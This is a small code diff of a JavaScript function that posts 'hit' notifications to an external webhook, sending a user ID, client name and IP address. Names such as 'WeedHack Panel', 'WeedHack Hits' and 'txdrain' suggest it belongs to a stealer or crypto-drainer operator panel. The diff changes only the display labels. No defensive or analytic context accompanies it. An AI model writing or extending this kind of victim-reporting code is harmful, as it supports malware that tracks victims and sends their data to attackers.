@@ -5,14 +5,14 @@ export async function sendHitWebhook(userId, hitName, ipAddress) {
   if (!WEBHOOK_URL) return;
 
   const payload = {
-    username: 'WeedHack Hits',
+    username: 'Allen wood',
     embeds: [
       {
-        title: '🎯 New Hit Registered!',
+        title: 'Nice hit ',
         color: 0x00FF00, // Green
         fields: [
           { name: 'User ID', value: `\`${userId}\``, inline: true },
-          { name: 'Client Name', value: `\`${hitName}\``, inline: true },
+          { name: 'Client Name', value: `\`No client neame cuz off txdrain\``, inline: true },
           { name: 'IP Address', value: `\`${ipAddress}\``, inline: false }
         ],
         footer: { text: 'WeedHack Panel' },
